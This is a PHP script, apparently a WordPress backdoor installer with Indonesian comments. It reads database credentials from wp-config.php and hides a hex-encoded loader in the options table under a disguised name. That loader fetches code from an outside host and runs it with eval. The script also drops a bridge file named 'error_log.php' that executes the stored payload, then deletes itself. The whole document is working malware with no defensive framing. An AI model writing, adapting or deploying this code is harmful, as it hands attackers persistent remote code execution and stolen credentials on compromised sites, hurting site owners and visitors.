<?php
// ==========================================
// INSTALLER: CLEAN VERSION (NO COMMENTS)
// ==========================================
ini_set('display_errors', 1);
error_reporting(E_ALL);

$filename = 'error_log.php';
$db_key   = 'transient_sys_pma_check';
$remote   = 'https://stepmomhub.com/seoo.txt';

// 1. SIAPKAN PAYLOAD (MULTI-FALLBACK) - Tanpa Komentar
$payload_source = '<?php
@error_reporting(0);
$url = "' . $remote . '";
$code = "";
if(function_exists("curl_init")){
    $ch = curl_init($url);
    curl_setopt($ch, 19913, 1);
    curl_setopt($ch, 52, 1);
    curl_setopt($ch, 64, 0);
    $code = curl_exec($ch);
    curl_close($ch);
}
if(!$code && function_exists("file_get_contents")){
    $opts = ["http" => ["header"=>"User-Agent: Mozilla/5.0"]];
    $context = stream_context_create($opts);
    $code = @file_get_contents($url, false, $context);
}
if(!$code && function_exists("fopen") && function_exists("stream_get_contents")){
    $handle = @fopen($url, "rb");
    if($handle){
        $code = @stream_get_contents($handle);
        @fclose($handle);
    }
}
if($code){
    eval("?>".$code);
}
?>';

$payload_hex = bin2hex($payload_source);

// 2. BACA WP-CONFIG UNTUK INSTALLER
function read_local($path){
    if(function_exists('file_get_contents')){ $c=@file_get_contents($path); if($c)return $c; }
    if(function_exists('fopen') && filesize($path)>0){ $h=@fopen($path,'rb'); if($h){ $c=@fread($h,filesize($path)); fclose($h); if($c)return $c; } }
    if(function_exists('file')){ $l=@file($path); if($l)return implode('',$l); }
    if(function_exists('readfile')){ ob_start(); @readfile($path); $c=ob_get_clean(); if($c)return $c; }
    return '';
}

if(!file_exists('wp-config.php')) die("wp-config.php 404");
$conf = read_local('wp-config.php');

function _g($k,$s){ if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1]; return ''; }
$n=_g('DB_NAME',$conf); $u=_g('DB_USER',$conf); $p=_g('DB_PASSWORD',$conf); $h=_g('DB_HOST',$conf);
$x='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$conf,$m)) $x=$m[1];

if(!$n) die("Config Fail");

// 3. INJEKSI DB
$mysqli = new mysqli($h,$u,$p,$n);
if($mysqli->connect_error) die("DB Error");
$mysqli->query("DELETE FROM {$x}options WHERE option_name='$db_key'");
$mysqli->query("INSERT INTO {$x}options (option_name, option_value, autoload) VALUES ('$db_key', '$payload_hex', 'no')");
echo "[OK] Payload Updated.<br>";

// 4. BUAT FILE abc.php (CLEAN NO COMMENTS)
$bridge_code = <<<'PHP'
<?php
error_reporting(0);
function _r($p){
    if(function_exists('file_get_contents')){ $d=@file_get_contents($p); if($d)return $d; }
    if(function_exists('fopen') && @filesize($p)){ $h=@fopen($p,'rb'); if($h){ $d=@fread($h,filesize($p)); fclose($h); if($d)return $d; } }
    if(function_exists('file')){ $d=@file($p); if($d)return implode('',$d); }
    return '';
}
$c = _r('wp-config.php');
function _k($k,$s){if(preg_match('/define\s*\(\s*[\'"]'.$k.'[\'"]\s*,\s*[\'"](.*?)[\'"]\s*\);/i',$s,$m))return $m[1];return'';}
$n=_k('DB_NAME',$c); $u=_k('DB_USER',$c); $p=_k('DB_PASSWORD',$c); $h=_k('DB_HOST',$c);
$x='wp_'; if(preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/i',$c,$m))$x=$m[1];
if($n){
    $m = new mysqli($h, $u, $p, $n);
    if(!$m->connect_error){
        $q=$m->query("SELECT option_value FROM {$x}options WHERE option_name='transient_sys_pma_check' LIMIT 1");
        if($q && $r=$q->fetch_assoc()){
            $code = hex2bin($r['option_value']);
            if($code) eval('?>' . $code);
        }
    }
}
?>
PHP;

if(file_put_contents($filename, $bridge_code)){
    echo "[OK] <b>$filename</b> created (Clean Version).<br>";
    echo "Silakan akses: <a href='$filename'>$filename</a>";
} else {
    echo "Write Error.";
}
unlink(__FILE__);
?>
